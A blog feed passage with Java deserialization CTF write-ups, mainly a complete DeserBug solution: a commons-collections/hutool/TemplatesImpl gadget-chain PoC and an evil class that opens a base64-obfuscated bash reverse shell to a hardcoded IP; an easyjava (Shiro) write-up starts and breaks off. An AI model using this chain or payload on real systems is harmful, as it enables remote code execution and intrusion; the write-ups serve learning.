   * Sets the driver class.     ** <span class="doctag">@param</span> driverClass  </span></span><br><span class="line"><span class="comment">     *          The driver class to set  </span></span><br><span class="line"><span class="comment">     */</span>    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDriverClass</span><span class="params">(String driverClass)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.driverClass = driverClass;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际调用点在getConnection, 因此需要序列化</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://b1ue.cn/archives/189.html">## Java 反序列化漏洞始末（4）— jackson</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;使用Jackson&quot;&gt;&lt;a href=&quot;#使用Jackson&quot; class=&quot;headerlink&quot; title=&quot;使用Jackson&quot;&gt;&lt;/a&gt;使用Jackson&lt;/h2&gt;&lt;p&gt;依赖&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;tabl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java题目大杂烩</title>
    <link href="http://example.com/2024/08/31/Java%E9%A2%98%E7%9B%AE%E5%A4%A7%E6%9D%82%E7%83%A9/"/>
    <id>http://example.com/2024/08/31/Java%E9%A2%98%E7%9B%AE%E5%A4%A7%E6%9D%82%E7%83%A9/</id>
    <published>2024-08-31T05:36:08.000Z</published>
    <updated>2024-10-22T17:02:31.861Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN-2023-初赛-DeserBug"><a href="#CISCN-2023-初赛-DeserBug" class="headerlink" title="[CISCN 2023 初赛]DeserBug"></a>[CISCN 2023 初赛]DeserBug</h2><p>题目给出的cc依赖版本为3.2.2</p><p>相对于经典的3.2.1, 几个重要的类被禁止反序列化了</p><p>例如<code>InvokerTransformer</code>重写了<code>readObject</code> <code>writeObject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream os)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">   FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == <span class="literal">null</span> ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>)) : class$org$apache$commons$collections$functors$InvokerTransformer);</span><br><span class="line">   os.defaultWriteObject();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream is)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">   FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == <span class="literal">null</span> ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>)) : class$org$apache$commons$collections$functors$InvokerTransformer);</span><br><span class="line">   is.defaultReadObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上在3.2.2中以下这些类都被禁用了:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WhileClosure</span><br><span class="line">CloneTransformer</span><br><span class="line">ForClosure</span><br><span class="line">InstantiateFactory</span><br><span class="line">InstantiateTransformer</span><br><span class="line">InvokerTransformer</span><br><span class="line">PrototypeCloneFactory</span><br><span class="line">PrototypeSerializationFactory</span><br></pre></td></tr></table></figure><p>那么考虑字节码加载</p><p>看一下题目源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myexpect</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> Class[] typeparam;</span><br><span class="line">   <span class="keyword">private</span> Object[] typearg;</span><br><span class="line">   <span class="keyword">private</span> Class targetclass;</span><br><span class="line">   <span class="keyword">public</span> String name;</span><br><span class="line">   <span class="keyword">public</span> String anyexcept;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Class <span class="title function_">getTargetclass</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.targetclass;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTargetclass</span><span class="params">(Class targetclass)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.targetclass = targetclass;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Object[] getTypearg() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.typearg;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTypearg</span><span class="params">(Object[] typearg)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.typearg = typearg;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">getAnyexcept</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> <span class="built_in">this</span>.targetclass.getConstructor(<span class="built_in">this</span>.typeparam);</span><br><span class="line">      <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.typearg);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAnyexcept</span><span class="params">(String anyexcept)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.anyexcept = anyexcept;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Class[] getTypeparam() &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.typeparam;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTypeparam</span><span class="params">(Class[] typeparam)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.typeparam = typeparam;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getAnyexcept</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> <span class="built_in">this</span>.targetclass.getConstructor(<span class="built_in">this</span>.typeparam);</span><br><span class="line">   <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.typearg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚好对应CC3的这里, 不过<code>InstantiateTransformer.transform()</code>这一步是用不了了, 所以要寻找<code>LazyMap.get()</code>到<code>TrAXFilter.constructor()</code>的链条</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240816214619253.png" alt="image-20240816214619253"></p><p>题目有一条提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</span><br></pre></td></tr></table></figure><p>这一步是隐式调用, 类似于fastjson中的那样</p><p>并且在<code>LazyMap#get</code>中恰好调用了<code>map.put</code></p><p>那么这条链子就成型了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240816215629072.png" alt="image-20240816215629072"></p><p>动手编写poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.app.Myexpect;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">       <span class="type">byte</span>[] codes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\CTF_DOC\\练习tmp\\DeserBug\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evilcodes = &#123;codes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(jsonObject, factory);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="number">3</span>);</span><br><span class="line">        jsonObject.remove(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evilcodes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_outputProperties&quot;</span>, <span class="keyword">new</span> <span class="title class_">Properties</span>());</span><br><span class="line"></span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(myexpect, <span class="string">&quot;targetclass&quot;</span>, TrAXFilter.class);</span><br><span class="line">        setValue(myexpect, <span class="string">&quot;typeparam&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;);</span><br><span class="line">        setValue(myexpect, <span class="string">&quot;typearg&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        setValue(factory, <span class="string">&quot;iConstant&quot;</span>, myexpect);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serialize = serialize(hashMap);</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(serialize);</span><br><span class="line">        System.out.println(poc);</span><br><span class="line">        saveFile(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        System.out.println(poc.length());</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(poc);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">saveFile</span><span class="params">(String poc, String fileName)</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> (<span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(fileName))) &#123;</span><br><span class="line">           writer.write(poc);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String key,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(key);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>evil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">extends</span> <span class="title class_">com</span>.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="MTCTF2022-easyjava"><a href="#MTCTF2022-easyjava" class="headerlink" title="[MTCTF2022]easyjava"></a>[MTCTF2022]easyjava</h2><p>先去看pom.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">8090</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=<span class="string">/web</span></span><br><span class="line"><span class="attr">spring.thymeleaf.cache</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">spring.thymeleaf.mode</span>=<span class="string">HTML5</span></span><br></pre></td></tr></table></figure><p>可以看见网站根目录在&#x2F;web</p><p>再看pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--hibernate--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.3.8.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有两处是存在漏洞的</p><p>看源码</p><p>HelloConctroller.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.butler.springboot14shiro.MyController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.butler.springboot14shiro.Util.MyObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.IncorrectCredentialsException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UnknownAccountException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">      model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/login&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">login</span><span class="params">(String username, String password, Model model)</span> &#123;</span><br><span class="line">      <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> SecurityUtils.getSubject();</span><br><span class="line">      <span class="type">UsernamePasswordToken</span> <span class="variable">token</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordToken</span>(username, password);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         subject.login(token);</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;admin/hello&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (UnknownAccountException var7) &#123;</span><br><span class="line">         model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;用户名错误&quot;</span>);</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IncorrectCredentialsException var8) &#123;</span><br><span class="line">         model.addAttribute(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;密码错误&quot;</span>);</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/admin/hello&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">admin</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;,required = false)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception 